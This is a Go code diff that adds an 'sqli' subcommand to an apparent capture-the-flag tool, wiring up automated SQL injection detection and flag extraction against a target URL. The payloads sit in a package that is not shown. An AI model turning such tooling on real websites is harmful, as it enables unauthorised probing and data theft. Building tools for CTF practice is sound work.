@@ -22,6 +22,40 @@ func main() {
 
 	cmd := os.Args[1]
 	switch cmd {
+	case "sqli":
+		sqliCmd := flag.NewFlagSet("sqli", flag.ExitOnError)
+		targetURL := sqliCmd.String("url", "", "Target URL")
+		param := sqliCmd.String("param", "id", "Parameter name")
+		_ = sqliCmd.Parse(os.Args[2:])
+
+		if *targetURL == "" {
+			fmt.Println("Usage: ctf-tool sqli --url <target> --param <param>")
+			os.Exit(1)
+		}
+
+		send := sqli.BuildSender(*targetURL, *param)
+
+		baseline, err := send("1")
+		if err != nil {
+			log.Fatal(err)
+		}
+
+		ok, payload := sqli.Detect(send, baseline)
+		if !ok {
+			fmt.Println("[-] No SQL Injection detected")
+			return
+		}
+
+		fmt.Println("[+] Possible SQL Injection detected")
+		fmt.Println("    Payload:", payload)
+
+		found, flagVal := sqli.ExtractFlag(send)
+		if found {
+			fmt.Println("[✔] FLAG FOUND:", flagVal)
+		} else {
+			fmt.Println("[!] SQLi confirmed but flag not found")
+		}
+
 	case "map":
 		mapCmd := flag.NewFlagSet("map", flag.ExitOnError)
 		targetURL := mapCmd.String("url", "", "Target URL")
